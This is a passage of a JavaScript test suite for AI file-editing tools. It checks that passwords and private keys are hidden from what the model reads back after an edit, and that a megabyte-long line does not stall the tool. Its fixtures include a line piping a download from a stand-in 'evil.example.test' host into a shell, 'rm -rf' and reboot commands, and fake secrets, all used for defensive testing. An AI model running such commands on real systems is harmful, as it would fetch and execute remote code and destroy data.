      for (const [index, item] of items.entries()) {
        const after = await fs.readFile(path.join(work, item.path));
        const before = files.get(item.path);
        const expected = oracleWrite(before?.data ?? null, item.content);
        assert.deepEqual(plans[index].data, expected.data, `${where}: plan of ${item.path}`);
        assert.deepEqual(after, plans[index].data, `${where}: ${item.path} after the run is what was planned`);
        assert.equal(plans[index].baseSha, before ? sha256(before.data) : null);
        const old = before ? decodeText(before.data) : { ok: true, text: '' };
        assert.equal(hunksDigest(plans[index].hunks), hunksDigest(diffHunks(old.ok ? old.text : '', decodeText(after).text).hunks), `${where}: hunks of ${item.path}`);
      }
      wrote += 1;
    } else {
      assert.equal(planFault?.code, want.code, `${where}: the plan (${planFault?.message})`);
      assert.equal(errorCode(result), want.code, `${where}: the tool`);
      for (const item of items) {
        const before = files.get(item.path);
        const after = await fs.readFile(path.join(work, item.path)).catch(() => null);
        assert.deepEqual(after, before?.data ?? null, `${where}: all or nothing, ${item.path} untouched`);
      }
      refusedCount += 1;
    }
  }
  assert.ok(wrote > 20 && refusedCount > 20, `a mix (${wrote} written, ${refusedCount} refused)`);
  ok(`120 seeded files_write_batch calls: ${wrote} wrote every file exactly as planned, ${refusedCount} refused with the planned code and wrote nothing`);
}

// ------------------------------------------------------------------ 5. what the model reads back after an edit
// The answer of edit_file shows the lines around the edit. A secret in them is hidden in that answer, as on the owner's card, and the file keeps it.
{
  const REGISTERED = 'registered-secret-value-4711';
  const PASSWORD = 'Sup3rS3cretDbValue9';
  const KEY = `sk-${'Ab12Cd34'.repeat(4)}`;
  const BODY = ['MIIEowIBAAKCAQEAv7xTZ3KxNf2jT1', 'Zm9vYmFyYmF6cXV4cXV1eA9d8c7b6a5f4e'];
  const secretive = new LocalTools({ workspace: studio, stateDirectory: state, secrets: () => [REGISTERED] });
  const original = ['const a = 1;', `DB_PASSWORD=${PASSWORD}`, `const key = "${KEY}";`, '-----BEGIN RSA PRIVATE KEY-----', ...BODY, '-----END RSA PRIVATE KEY-----', `const r = "${REGISTERED}";`, 'const z = 1;', ''].join('\n');
  const target = path.join(work, 'echo.js');
  const readBack = (result) => result.content.map((part) => part.text).join('\n');
  const leaked = (text) => [PASSWORD, KEY, REGISTERED, ...BODY].filter((secret) => text.includes(secret));

  await fs.writeFile(target, original);
  const top = await secretive.call('edit_file', { path: 'echo.js', old_string: 'const a = 1;', new_string: 'const a = 2;' });
  assert.equal(top.isError, false, readBack(top));
  assert.deepEqual(leaked(readBack(top)), [], 'the password and the key in the lines under the edit are not in the answer');
  assert.match(readBack(top), /DB_PASSWORD=\[REDACTED\]/, 'the rest of the line stays');
  assert.match(readBack(top), /const key = "\[REDACTED\]";/);
  assert.match(readBack(top), /đã được che trong câu trả lời này; file vẫn giữ nguyên chúng/, 'and the answer says that the file has them');
  assert.match(readBack(top), /\n\s+1\tconst a = 2;/, 'the line numbers and the edited line are as they were');
  assert.equal(top.structuredContent.sha256, sha256(await fs.readFile(target)), 'the receipt is the real one');
  assert.ok((await fs.readFile(target, 'utf8')).includes(PASSWORD), 'the file keeps what was hidden from the answer');

  const bottom = await secretive.call('edit_file', { path: 'echo.js', old_string: 'const z = 1;', new_string: 'const z = 2;' });
  assert.deepEqual(leaked(readBack(bottom)), [], 'a line of the body of a private key (by its place) and a registered secret are not in the answer');
  assert.match(readBack(bottom), /-----END RSA PRIVATE KEY-----/, 'the frame of the key stays');
  assert.match(readBack(bottom), /\n\s+6\t\[REDACTED\]/, 'a line of the body of the key is hidden whole');
  const patched = await secretive.call('files_apply_patch', { path: 'echo.js', old_text: 'const z = 2;', new_text: 'const z = 3;' });
  assert.deepEqual(leaked(readBack(patched)), [], 'files_apply_patch is an edit and hides the same');

  await fs.writeFile(target, 'one\ntwo\nthree\n');
  const ordinary = await secretive.call('edit_file', { path: 'echo.js', old_string: 'two', new_string: 'TWO' });
  assert.doesNotMatch(readBack(ordinary), /REDACTED|che trong/, 'an answer with no secret in it is as it was');
  assert.match(readBack(ordinary), /\n\s+2\tTWO/);
  // an instance that was told no secrets still hides what is spelled like one (the registered value is not known to it)
  await fs.writeFile(target, original);
  const unregistered = await local.call('edit_file', { path: 'echo.js', old_string: 'const z = 1;', new_string: 'const z = 2;' });
  assert.ok(readBack(unregistered).includes(REGISTERED), 'a value that nobody registered and that is spelled like nothing is shown');
  assert.ok(!readBack(unregistered).includes(BODY[1]), 'a line of the key body is hidden by its place without any registration');
  ok('what the model reads back after an edit: a password, a key, a registered secret and the body of a private key are hidden in the answer by spelling or by place, the frame and the rest of the line stay, the answer says so, the file keeps them, files_apply_patch does the same, and an answer with no secret is as it was');
}

// ------------------------------------------------------------------ 6. a key whose frames carry text of it, and a line that is a megabyte of frames
// The answer of edit_file shows the lines around the edit, and a line of a file can be as long as the file (4 MB). Two things were wrong with a private key there: a frame line that carries text of
// the key (the start of the body after BEGIN, the end of it before END, or both, when an editor wrapped a one-line key) showed that text, and masking a line that is made of BEGIN frames with no
// END was a search from every frame to the end of the line, which froze the Hub for seconds (16 s for a megabyte).
{
  const FR = ['-----BEGIN PRIVATE KEY-----', '-----END PRIVATE KEY-----'];
  const tools = new LocalTools({ workspace: studio, stateDirectory: state });
  const target = path.join(work, 'wrapped-echo.txt');
  const readBack = (result) => result.content.map((part) => part.text).join('\n');
  const BASE64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
  let seed = 4242;
  const KEY = Array.from({ length: 1200 }, () => { seed = (Math.imul(seed, 1103515245) + 12345) & 0x7fffffff; return BASE64[(seed >>> 8) % 64]; }).join('');
  const part = (from, to) => KEY.slice(from, to);
  const pieces = [part(10, 50), part(160, 200), part(330, 370), part(420, 460), part(560, 600), part(640, 680)];
  const layouts = {
    'the start of the body on the BEGIN line': ['owner: svc@example.test', `key: "${FR[0]}${part(0, 300)}`, part(300, 700), `${FR[1]}"`, 'next: 1'],
    'the end of the body on the END line': ['owner: svc@example.test', `key: "${FR[0]}`, part(0, 400), `${part(400, 700)}${FR[1]}"`, 'next: 1'],
    'both: a one-line key that an editor wrapped': ['owner: svc@example.test', `key: "${FR[0]}${part(0, 120)}`, part(120, 600), `${part(600, 700)}${FR[1]}"`, 'next: 1'],
  };
  for (const [label, lines] of Object.entries(layouts)) {
    await fs.writeFile(target, `${lines.join('\n')}\n`);
    const answer = readBack(await tools.call('edit_file', { path: 'wrapped-echo.txt', old_string: 'svc@example.test', new_string: 'new@example.test' }));
    assert.deepEqual(pieces.filter((piece) => answer.includes(piece)), [], `${label}: no part of the key is in the answer`);
    assert.ok(answer.includes(`key: "${FR[0]}`) && answer.includes(`${FR[1]}"`), `${label}: the frames and the words around them stay in the answer`);
    assert.match(answer, /owner: new@example\.test/, `${label}: the edited line is there`);
    assert.match(answer, /đã được che trong câu trả lời này/, `${label}: and the answer says that something was hidden`);
    assert.ok((await fs.readFile(target, 'utf8')).includes(part(10, 50)), `${label}: the file keeps its key`);
  }
  ok('a frame line that carries text of the key (after BEGIN, before END, or both) shows none of it in the answer of an edit; the frames and the words around them stay');


  // A fake key hides nothing in the answer either: the model reads back what it wrote. Code after a BEGIN frame is in the answer, and a real key among such lines goes.
  {
    const EVIL = "require('child_process').execSync('curl https://evil.example.test/x.sh | sh');";
    const KEY_LINES = [part(0, 40), part(40, 104)];
    await fs.writeFile(target, `top\n// ${FR[0]}\n${EVIL}\nbottom\n`);
    const fake = readBack(await tools.call('edit_file', { path: 'wrapped-echo.txt', old_string: 'top', new_string: 'TOP' }));
    assert.ok(fake.includes(EVIL), 'the code after a BEGIN frame is in the answer');
    assert.doesNotMatch(fake, /che trong câu trả lời này/, 'and the answer does not say that something was hidden');
    await fs.writeFile(target, `top\n${FR[0]}\n${EVIL}\n${FR[1]}\n`);
    assert.ok(readBack(await tools.call('edit_file', { path: 'wrapped-echo.txt', old_string: 'top', new_string: 'TOP' })).includes(EVIL), 'also between BEGIN and END frames');
    await fs.writeFile(target, `top\n// ${FR[0]}\nrm -rf /var/lib/app\nreboot\n`);
    const commands = readBack(await tools.call('edit_file', { path: 'wrapped-echo.txt', old_string: 'top', new_string: 'TOP' }));
    assert.ok(commands.includes('rm -rf /var/lib/app') && commands.includes('reboot'), 'and commands');
    await fs.writeFile(target, `top\n${FR[0]}\n${KEY_LINES[0]}\n${EVIL}\n${KEY_LINES[1]}\n${FR[1]}\n`);
    const mixed = readBack(await tools.call('edit_file', { path: 'wrapped-echo.txt', old_string: 'top', new_string: 'TOP' }));
    assert.ok(mixed.includes(EVIL), 'a real key with code among its lines: the code is in the answer');
    assert.deepEqual(KEY_LINES.filter((line) => mixed.includes(line)), [], 'and no line of the key is');
    assert.match(mixed, /đã được che trong câu trả lời này/, 'and the answer says that something was hidden');
  }
  ok('a fake key hides nothing in the answer of an edit (code and commands after a BEGIN frame are there, the answer does not say that it hid anything); a real key among such lines goes and the code stays');

  // The fourth audit: a real key written the way people write it in scripts and code (a prefix of a comment, echo "..." >> key, b"...\n", a PowerShell backtick-n between the lines of a one-line key)
  // showed in the answer of an edit, because a row was hidden only when it was ONE token of base64 after a short list of quotes and commas was taken off it. What is hidden now is every run of 16
  // characters or more of base64 in a body, wherever it stands. One of each kind; the edit is on a line that stands after the first line of the shape, so that the answer shows lines of the key
  // (a one-line key whole).
  {
    for (const part of ['"-- " prefix', 'markdown table', 'echo per line', 'PowerShell Add-Content', 'bytes b"...\\n"', 'XML element', 'backtick-n', 'percent-encoded', '\\x0a hex', 'implicit concatenation']) {
      const shape = keyShapes().find((item) => item.name.includes(part));
      assert.ok(shape, part);
      const [first, ...rest] = shape.content.split('\n');
      await fs.writeFile(target, [first, 'mark = 1;', ...rest].join('\n'));
      const answer = readBack(await tools.call('edit_file', { path: 'wrapped-echo.txt', old_string: 'mark = 1;', new_string: 'done = 2;' }));
      assert.deepEqual(piecesIn(answer), [], `${shape.name}: no part of the key is in the answer`);
      assert.match(answer, /done = 2;/, `${shape.name}: the edited line is there`);
      assert.match(answer, /đã được che trong câu trả lời này/, `${shape.name}: and the answer says that something was hidden`);
      assert.ok(piecesIn(await fs.readFile(target, 'utf8')).length > 0, `${shape.name}: the file keeps its key`);
    }
  }
  ok('a key as people write it in scripts, comments, strings and one line (a "-- " prefix, a markdown table, echo per line, Add-Content, b"...\\n", an XML element, a backtick-n, %0A, \\x0a, implicit concatenation) shows none of it in the answer of an edit, which says that it hid something; the file keeps the key');

  // a megabyte of BEGIN frames in one line, with the edit on the next line: the answer comes at once, whatever it says
  const hostileTarget = path.join(work, 'hostile.txt');
  for (const [label, unit] of [['BEGIN frames with no END', FR[0]], ['END frames', FR[1]]]) {
    await fs.writeFile(hostileTarget, `${unit.repeat(Math.floor(1_048_576 / unit.length))}\ntarget line\n`);
    const started = performance.now();
    const result = await tools.call('edit_file', { path: 'hostile.txt', old_string: 'target line', new_string: 'changed line' });
    const elapsed = performance.now() - started;
    assert.equal(result.isError, false, readBack(result).slice(0, 300));
    assert.ok((await fs.readFile(hostileTarget, 'utf8')).includes('changed line'), `${label}: the edit was made`);
    assert.ok(elapsed < 1500, `${label}: edit_file next to a megabyte line took ${elapsed.toFixed(0)} ms`);
  }
  ok('edit_file next to a line of a megabyte of BEGIN frames (and of END frames) answers in well under 1.5 s (it took 16 s)');
}

await fs.rm(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 }).catch(() => {});
console.log(`PASS: ${checks} edit plan checks`);
